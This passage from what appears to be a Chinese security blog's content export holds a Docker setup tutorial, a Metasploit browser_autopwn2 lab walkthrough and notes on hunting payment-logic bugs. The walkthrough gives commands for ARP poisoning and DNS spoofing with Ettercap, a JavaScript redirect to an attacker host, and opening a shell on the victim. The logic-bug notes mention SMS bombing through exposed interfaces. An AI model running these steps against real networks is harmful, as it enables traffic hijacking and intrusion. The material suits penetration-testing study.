-d</code>命令，就不需要再次编译相关镜像了。</p><p><strong>参考链接</strong>：</p><p>Vulhub官方文档：<a href="https://vulhub.org/#/docs/" target="_blank" rel="noopener">https://vulhub.org/#/docs/</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> Vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker入门&amp;&amp;环境部署实例</title>
      <link href="/2019/04/28/docker%E5%85%A5%E9%97%A8-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%E5%AE%9E%E4%BE%8B/"/>
      <url>/2019/04/28/docker%E5%85%A5%E9%97%A8-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%E5%AE%9E%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="一、docker介绍"><a href="#一、docker介绍" class="headerlink" title="一、docker介绍"></a>一、docker介绍</h1><p>docker是开源的应用程序容器引擎，使用go语言开发，借助于docker打包用户的应用程序，将这些应用程序包含在容器中，实现虚拟化，容器是完全使用沙箱机制，相互独立，占用资源非常少。</p><a id="more"></a><h1 id="二、docker三大核心概念"><a href="#二、docker三大核心概念" class="headerlink" title="二、docker三大核心概念"></a>二、docker三大核心概念</h1><ul><li><p>镜像</p><ul><li>image, docker镜像就是一个只读的模板，例如一个镜像中可以包含完整的操作系统，里面安装apache/php/mysql等环境，镜像可以创建容器</li></ul></li><li><p>容器</p><ul><li>container，docker利用容器运行程序，容器是从镜像中创建运行的实例，容器可以运行、关闭、删除</li></ul></li><li>仓库<ul><li>repository，集中存放镜像的地方，每个仓库中包含多个镜像，分为私有和公开，dockerHub</li></ul></li></ul><h1 id="三、docker安装"><a href="#三、docker安装" class="headerlink" title="三、docker安装"></a>三、docker安装</h1><h2 id="1-一键安装Docker"><a href="#1-一键安装Docker" class="headerlink" title="1. 一键安装Docker"></a>1. 一键安装Docker</h2><ol><li><p>这是推荐方式。在未安装过Docker的机器上，root权限执行如下命令即可一键安装最新版Docker：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure></li><li><p>也可以使用系统自带的包管理工具来安装，比如在Ubuntu下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure></li></ol><h2 id="2-手动安装"><a href="#2-手动安装" class="headerlink" title="2.手动安装"></a>2.手动安装</h2><p>常见操作系统安装Docker的方法在文档中均可查阅，这里就不再赘述： <a href="https://docs.docker.com/engine/installation/" target="_blank" rel="noopener">https://docs.docker.com/engine/installation/</a></p><p><strong>注意</strong>，docker是一个系统服务，所以，安装完成后可能需要手工启动服务：<code>service start docker</code>，否则会出现连接失败的情况。同样，如果docker没有自启动，你也需要手工启动docker服务。如果你是使用一键安装工具安装的docker，则docker会自动启动。</p><h2 id="3-加入docker组"><a href="#3-加入docker组" class="headerlink" title="3. 加入docker组"></a>3. 加入docker组</h2><p>安装完成之后，普通用户每次执行docker命令都需要加上<code>sudo</code> ，所以我们可以加入doker用户组获取操作权限</p><ol><li><p>使用有sudo权限的帐号登录系统</p></li><li><p>创建docker分组，并将相应的用户添加到这个分组里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker your_username</span><br></pre></td></tr></table></figure></li><li><p>退出，然后重新登录，以便让权限生效</p></li></ol><h2 id="4-添加国内镜像仓库"><a href="#4-添加国内镜像仓库" class="headerlink" title="4. 添加国内镜像仓库"></a>4. 添加国内镜像仓库</h2><p>由于官方资源库在国外，我们在拉取镜像资源的时候会很慢。所以，国内的Docker爱好者们就添加了一些国内的镜像（mirror）,方便大家使用。</p><p><strong>国内加速站点</strong></p><ul><li><p><a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors" target="_blank" rel="noopener">阿里云</a></p></li><li><p><a href="https://c.163yun.com/hub#/m/home/" target="_blank" rel="noopener">网易云</a></p></li><li><p><a href="https://www.daocloud.io/mirror" target="_blank" rel="noopener">DaoCloud</a></p></li></ul><ol><li><p>使用脚本来配置加速站点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</span><br></pre></td></tr></table></figure></li><li><p>使用命令来配置加速站点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&apos;EOF&apos;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;&lt;your accelerate address&gt;&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>以上操作后重启一下 Docker</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure></li></ol><h1 id="五、docker基本使用"><a href="#五、docker基本使用" class="headerlink" title="五、docker基本使用"></a>五、docker基本使用</h1><h2 id="1-启动docker"><a href="#1-启动docker" class="headerlink" title="1. 启动docker"></a>1. 启动docker</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker//centos</span><br><span class="line">server docker start//ubuntu</span><br></pre></td></tr></table></figure><p><strong>查看基本信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker info//当前容器的信息</span><br><span class="line">docker stats//运行容器的进程信息</span><br><span class="line">docker version//版本信息</span><br></pre></td></tr></table></figure><h2 id="2-镜像操作"><a href="#2-镜像操作" class="headerlink" title="2. 镜像操作"></a>2. 镜像操作</h2><p><strong>搜索镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search [关键字]</span><br></pre></td></tr></table></figure><p><strong>拉取镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull [镜像全称]:版本标签(可选)</span><br></pre></td></tr></table></figure><p><strong>查看本地镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p><strong>删除镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi []</span><br></pre></td></tr></table></figure><p><strong>导出镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save [容器id/名称] &gt; test.tar</span><br></pre></td></tr></table></figure><p><strong>导入镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker road &lt; test.tar</span><br></pre></td></tr></table></figure><h2 id="3-容器操作"><a href="#3-容器操作" class="headerlink" title="3. 容器操作"></a>3. 容器操作</h2><p><strong>启动容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -P --rm --name [容器名字] [镜像名称] [可执行命令]</span><br><span class="line">参数说明：</span><br><span class="line">-d：让容器在后台运行</span><br><span class="line">-P：将容器内部使用的网络端口映射到宿主机</span><br><span class="line">-p：[主机端口:容器端口] 可自定义映射端口</span><br><span class="line">--name：可自定义容器名称</span><br><span class="line">--rm：当容器停止时，会自动删除</span><br></pre></td></tr></table></figure><p><strong>查看运行容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><strong>查看容器端口</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker port [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>查看容器内部日志</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f [容器id/名称] //可以查看容器内部的标准输出</span><br><span class="line">-f: 让 docker logs 像使用 tail -f 一样来输出容器内部的标准输出</span><br></pre></td></tr></table></figure><p><strong>进入容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it [容器id/名称] /bin/bash//推荐使用</span><br><span class="line">docker attach [容器id/名称] //不会在容器中创建进程执行额外的命令，只是附着到容器上</span><br><span class="line">//attach必须登陆到一个已经运行的容器里，如果从这个容器中exit退出的话，就会导致容器停止</span><br></pre></td></tr></table></figure><p><strong>离开容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+P+Q//正常退出不关闭容器</span><br><span class="line">exit//退出之后关闭容器,可以使用下面的流程进行恢复</span><br><span class="line">使用docker restart命令重启容器</span><br><span class="line">使用docker attach命令进入容器</span><br></pre></td></tr></table></figure><p><strong>停止容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>重新开启容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>查看所有容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>查看容器底层信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>删除容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker rm [容器id/名称]</span><br><span class="line">//删除前必须先停止正在运行的容器</span><br></pre></td></tr></table></figure><p><strong>导出容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker export [容器id/名称] &gt; test.tar</span><br></pre></td></tr></table></figure><p><strong>导入容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker import &lt; test.tar</span><br></pre></td></tr></table></figure><p><strong>docker批量删除容器、镜像</strong></p><p>一条命令实现停用并删除容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop $(docker ps -q) &amp; docker rm $(docker ps -aq)</span><br></pre></td></tr></table></figure><p>删除所有镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure><p>按条件删除容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm $(docker ps -a | awk &apos;/test\/webapp/ &#123;print $1&#125;&apos;)</span><br></pre></td></tr></table></figure><p>按条件删除镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#没有打标签</span><br><span class="line">docker rmi `docker images -q | awk &apos;/^&lt;none&gt;/ &#123; print $3 &#125;&apos;`</span><br><span class="line">#镜像名包含关键字</span><br><span class="line">docker rmi --force `docker images | grep keywords | awk &apos;&#123;print $3&#125;&apos;`   </span><br><span class="line">//其中keywords为关键字</span><br></pre></td></tr></table></figure><h1 id="六、容器部署实例"><a href="#六、容器部署实例" class="headerlink" title="六、容器部署实例"></a>六、容器部署实例</h1><h3 id="1-安装nginx"><a href="#1-安装nginx" class="headerlink" title="1. 安装nginx"></a>1. 安装nginx</h3><ul><li>从docker hub上拉取镜像</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull nginx:latest</span><br></pre></td></tr></table></figure><ul><li>托管一些简单的静态内容</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run --name some-nginx -v  $PWD/html:/usr/share/nginx/html:ro -d nginx</span><br><span class="line"> -v $PWD/html:/usr/share/nginx/html：将主机中当前目录下的html挂载到容器的/usr/share/nginx/html</span><br></pre></td></tr></table></figure><ul><li>或者准备自己的配置文件和文件目录</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 80:80 --name mynginx -v $PWD/www:/www -v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf -v $PWD/logs:/wwwlogs  -d nginx</span><br><span class="line">#dockerhub上有详细自定义配置部署说明</span><br><span class="line">-p 80:80：将容器的80端口映射到主机的80端口</span><br><span class="line">--name mynginx：将容器命名为mynginx</span><br><span class="line">-v $PWD/www:/www：将主机中当前目录下的www挂载到容器的/www</span><br><span class="line">-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf：将主机中当前目录下的nginx.conf挂载到容器的/etc/nginx/nginx.conf</span><br><span class="line">-v $PWD/logs:/wwwlogs：将主机中当前目录下的logs挂载到容器的/wwwlogs</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：如果出现以下类似报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker: Error response from daemon: OCI runtime create failed: container_linux.go:344: starting container process caused &quot;process_linux.go:424: container init caused \&quot;rootfs_linux.go:58: mounting \\\&quot;/opt/nginx/conf/nginx.conf\\\&quot; to rootfs \\\&quot;/var/lib/docker/overlay2/f72f02d7a8f04291ee3dd0515fd75cbaa8e12904816f5bb84c714da3d43f7cf0/merged\\\&quot; at \\\&quot;/var/lib/docker/overlay2/f72f02d7a8f04291ee3dd0515fd75cbaa8e12904816f5bb84c714da3d43f7cf0/merged/etc/nginx/nginx.conf\\\&quot; caused \\\&quot;not a directory\\\&quot;\&quot;&quot;: unknown: Are you trying to mount a directory onto a file (or vice-versa)? Check if the specified host path exists and is the expected type.</span><br></pre></td></tr></table></figure><p>是因为没提前创建好挂载目录和配置文件导致conf/nginx.conf 自动创建成目录，删除并创建nginx.conf配置文件即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ll conf/</span><br><span class="line">rm -r conf/nginx.conf</span><br><span class="line">touch conf/nginx.conf</span><br></pre></td></tr></table></figure><ul><li>查看运行容器</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/docker入门-环境部署实例/8268763-bde19eff6c1fd6ea.png" alt="当前正在运行的容器"></p><h3 id="2-安装Lamp环境"><a href="#2-安装Lamp环境" class="headerlink" title="2. 安装Lamp环境"></a>2. 安装Lamp环境</h3><p>拉取一个lamp镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull fauria/lamp</span><br></pre></td></tr></table></figure><p>创建lamp目录&amp;挂载路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/lamp &amp;&amp; cd ~/lamp</span><br><span class="line">mkdir www logs</span><br></pre></td></tr></table></figure><p>创建容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d  -p 80:80 -v /opt/lamp/www:/var/www/html -v /opt/lamp/logs/:/var/log/httpd --name my-lamp-container fauria/lamp</span><br></pre></td></tr></table></figure><p>查看是否启动成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/docker入门-环境部署实例/8268763-1fab64e3d8195ff5.png" alt="STATUS为UP说明启动成功"></p><p>查看所有容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>进入一个已经在运行的容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#其中字符串为容器ID</span><br><span class="line">docker exec -it d27bd3998ad9 /bin/bash</span><br></pre></td></tr></table></figure><p>删除容器删除前先停止</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop  d27b  &amp; docker rm d27b</span><br></pre></td></tr></table></figure><h1 id="七、最后"><a href="#七、最后" class="headerlink" title="七、最后"></a>七、最后</h1><p>本文只是起到docker的入门作用，如果想深入学习</p><p>以下推荐几个dokcer在线学习网站</p><p>[Docker 教程 | 菜鸟教程]<a href="http://www.runoob.com/docker/docker-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/docker/docker-tutorial.html</a></p><p>[Docker 入门教程|阮一峰的网络日志]<a href="http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit利用-浏览器自动攻击</title>
      <link href="/2019/04/08/Metasploit%E5%88%A9%E7%94%A8-%E6%B5%8F%E8%A7%88%E5%99%A8%E8%87%AA%E5%8A%A8%E6%94%BB%E5%87%BB/"/>
      <url>/2019/04/08/Metasploit%E5%88%A9%E7%94%A8-%E6%B5%8F%E8%A7%88%E5%99%A8%E8%87%AA%E5%8A%A8%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>browser_autopwn是Metasploit提供的辅助功能模块。在用户访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前，browser_autopwn能够检测用户使用的浏览器类型，自动部署最合适的exploit。</p><a id="more"></a><h2 id="二、测试环境"><a href="#二、测试环境" class="headerlink" title="二、测试环境"></a>二、测试环境</h2><ul><li><p>本地局域网络</p></li><li><p>Kali</p></li><li><p>Windows Server 2003 / xp </p></li></ul><h2 id="三、使用工具"><a href="#三、使用工具" class="headerlink" title="三、使用工具"></a>三、使用工具</h2><ul><li><p>Metasploit</p></li><li><p>Ettercap</p></li></ul><h2 id="四、Exp"><a href="#四、Exp" class="headerlink" title="四、Exp"></a>四、Exp</h2><p>browser_autopwn2</p><h2 id="五、目的"><a href="#五、目的" class="headerlink" title="五、目的"></a>五、目的</h2><p>如果在同一局域网，目标机器上没有可成功利用的端口时，我们可以尝试进行浏览器攻击。首先，在局域网中使用DNS欺骗，将用户的流量劫持到指定的站点，访问该站点页面会自动跳转至我们构造好的恶意URL上，然后获得反弹shell，这样就能达到获取权限目的。</p><h2 id="六、服务端准备"><a href="#六、服务端准备" class="headerlink" title="六、服务端准备"></a>六、服务端准备</h2><h3 id="1-启动MSF"><a href="#1-启动MSF" class="headerlink" title="1. 启动MSF"></a>1. 启动MSF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start//启动msf框架所依赖的数据库</span><br><span class="line">msfconsole//启动msfconsole</span><br></pre></td></tr></table></figure><h3 id="2-加载Exp"><a href="#2-加载Exp" class="headerlink" title="2. 加载Exp"></a>2. 加载Exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search browser_autopwn2//搜索browser_autopwn2模块</span><br><span class="line">use auxiliary/server/browser_autopwn2//使用该模块</span><br><span class="line">show options//查看参数，可默认无需修改</span><br><span class="line">set//查看设置内容</span><br><span class="line">run//启动模块</span><br></pre></td></tr></table></figure><p>等待出现URL，和 Server started</p><h3 id="3-构造恶意URL"><a href="#3-构造恶意URL" class="headerlink" title="3. 构造恶意URL"></a>3. 构造恶意URL</h3><p>在Apache中写上自动跳转的代码，向恶意URL上跳转</p><p>这里采用javascript实现：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="undefined">// 以下方式定时跳转</span></span><br><span class="line"><span class="undefined">setTimeout("javascript:location.href='http://192.168.10.3:8080/Y3JY6DI6gql5iSu'", 5000); </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-启动站点服务"><a href="#5-启动站点服务" class="headerlink" title="5.启动站点服务"></a>5.启动站点服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 start</span><br></pre></td></tr></table></figure><h2 id="七、攻击客户端"><a href="#七、攻击客户端" class="headerlink" title="七、攻击客户端"></a>七、攻击客户端</h2><h3 id="1-DNS欺骗"><a href="#1-DNS欺骗" class="headerlink" title="1. DNS欺骗"></a>1. DNS欺骗</h3><p><strong>使用Ettercap</strong></p><ol><li><p>打开Ettercap的 DNS文件，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure><p>添加欺骗的A记录和PTR（反向）记录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.*.comA192.168.10.3</span><br><span class="line">www.*.comPTR192.168.10.3</span><br></pre></td></tr></table></figure></li><li><p>kali中输入ettercap -G 进入该工具的图形化界面 </p><p>菜单栏选择sniff –&gt; Unified sniffing –&gt;选择上网网卡 </p><p>菜单栏选择Hosts –&gt; Scan for Hosts –&gt; 再点击host list</p><ul><li><p>选择欺骗目标的网关  添加到target1</p></li><li><p>选择欺骗目标的IP 添加到target2</p></li></ul><p>菜单栏选择Mitm–&gt;ARP poisoning–&gt;勾选Sniff remote connections（ARP欺骗）</p><p>菜单栏选择Plugins–&gt;Manage the plugins–&gt;选择dns-spoof（dns欺骗）</p><p>最后，菜单栏中找到start–&gt;start sniffing</p></li></ol><h3 id="2-等待目标使用浏览器"><a href="#2-等待目标使用浏览器" class="headerlink" title="2. 等待目标使用浏览器"></a>2. 等待目标使用浏览器</h3><ol><li><p>目标地址访问任意符合该URL的页面：www.***.com，即可成功跳转至恶意URL</p></li><li><p>访问我们的恶意页面后，该模块会自动选择最合适的exploit，进行攻击利用</p></li><li><p>等待一段时间，直到出现 Successfully migrated to process</p><p><img src="/2019/04/08/Metasploit利用-浏览器自动攻击/1554724873153.png" alt="1554724873153"></p></li><li><p>查看session</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -l</span><br></pre></td></tr></table></figure></li><li><p>选择相应序号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure></li><li><p>getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p><img src="/2019/04/08/Metasploit利用-浏览器自动攻击/1554725111543.png" alt="1554725111543"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
            <tag> 浏览器攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑漏洞挖掘思路-支付逻辑</title>
      <link href="/2019/04/07/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF-%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91/"/>
      <url>/2019/04/07/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF-%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91/</url>
      
        <content type="html"><![CDATA[<h2 id="一、现在src关注的重点"><a href="#一、现在src关注的重点" class="headerlink" title="一、现在src关注的重点"></a>一、现在src关注的重点</h2><p>​    随着常规漏洞的风险降低，以及挖掘难度的增加，现在的src更多的关注点，也就是白帽子关注的重点是逻辑漏洞。逻辑漏洞不要求有很深的基础，比如sql注入手工注入需要对sql注入有很深厚的理解；逻辑漏洞只需要对业务逻辑和关键参数有一定的了解，剩下的看运气。</p><a id="more"></a><h2 id="二、刷src之前的准备"><a href="#二、刷src之前的准备" class="headerlink" title="二、刷src之前的准备"></a>二、刷src之前的准备</h2><h3 id="1-信息收集（泛讲）"><a href="#1-信息收集（泛讲）" class="headerlink" title="1. 信息收集（泛讲）"></a>1. 信息收集（泛讲）</h3><p>​    渗透测试和漏洞挖掘，信息收集是贯彻于整个流程的；在进行src挖掘之前，要进行信息收集，在确定漏洞产生什么危害的时候，也要进行信息收集，也就是说渗透测试和漏洞挖掘的本质就是信息收集。</p><h3 id="2-具体要收集哪些信息"><a href="#2-具体要收集哪些信息" class="headerlink" title="2. 具体要收集哪些信息"></a>2. 具体要收集哪些信息</h3><ol><li><p>厂商域名和IP段（测试范围界定）</p><p>主站（可能防护较好），子站（子域名收集）</p><p>（明确测试范围，如果查出范围，有可能承担法律风险）</p></li><li><p>厂商业务信息（规划）</p><ul><li><p>如果业务架构较小，漏洞有限，不必去深挖</p></li><li><p>如果业务架构非常大，可以持久的挖</p></li></ul></li><li><p>子域名收集</p></li><li><p>IP段</p></li><li><p>端口（端口对应业务）</p></li><li><p>精准字典</p><ul><li><p>社工字典（站长信息，站点信息），</p><p>提高准确度，也增强自己的能力</p></li><li><p>不断收集字典，常见的（例：国人100弱密码）</p></li></ul></li><li><p>敏感接口</p><p>蛋糕那么小，人那么多，如果不选择一些不引人注意的范围进行利用的话，可能连粥都没得喝（简单例：如果接口外露，可以频繁的发起短信轰炸）</p></li><li><p>其他信息等</p></li></ol><h3 id="3-需要准备什么工具"><a href="#3-需要准备什么工具" class="headerlink" title="3. 需要准备什么工具"></a>3. 需要准备什么工具</h3><p>Burp suite and fiddler、Browser浏览器</p><p>或者仅需浏览器即可</p><h2 id="三、挖掘思路"><a href="#三、挖掘思路" class="headerlink" title="三、挖掘思路"></a>三、挖掘思路</h2><h3 id="1-锁定关键变量与深入逻辑"><a href="#1-锁定关键变量与深入逻辑" class="headerlink" title="1. 锁定关键变量与深入逻辑"></a>1. 锁定关键变量与深入逻辑</h3><ul><li><p>锁定关键可控变量</p></li><li><p>深入了解逻辑，进一步绕过</p></li></ul><p>​    不是单纯的靠工具跑出来，用工具跑出来的漏洞，不能叫漏洞了，因为没有你任何价值的体现。</p><p>​    例如sql注入关键变量是一个id的话，此时就要深入的判断它的一些字符型、数字型以及对它的逻辑进一步去挖掘。</p><p>​    所以说不管挖哪些漏洞，其实本质就是这个样子的，首先锁定一个关键的漏洞，紧接着深入了解一下他的逻辑具体是什么样子的，然后进一步的进行绕过。</p><h3 id="2-逻辑漏洞的定义"><a href="#2-逻辑漏洞的定义" class="headerlink" title="2. 逻辑漏洞的定义"></a>2. 逻辑漏洞的定义</h3><p>由于程序逻辑不严谨，导致逻辑未能正常处理或处理错误的漏洞成为逻辑漏洞。</p><p>零信任原则：不管用户输入任何东西，都是零信任的。</p><h3 id="3-了解逻辑业务"><a href="#3-了解逻辑业务" class="headerlink" title="3. 了解逻辑业务"></a>3. 